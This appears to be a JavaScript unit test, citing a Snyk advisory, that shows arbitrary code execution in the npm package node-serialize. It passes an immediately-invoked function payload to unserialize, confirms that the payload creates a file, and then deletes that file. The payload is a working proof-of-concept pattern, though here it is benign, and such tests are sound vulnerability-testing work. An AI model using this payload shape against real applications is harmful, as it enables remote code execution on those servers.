//https://security.snyk.io/vuln/npm:node-serialize:20170208
test("Arbitrary code execution in node-serialize", () => {
  const fs = require("fs");
  const serialize = require("node-serialize");
  const path = "./node-serialize";
  let payload =
    '{"rce":"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()"}';

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    serialize.unserialize(payload);
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
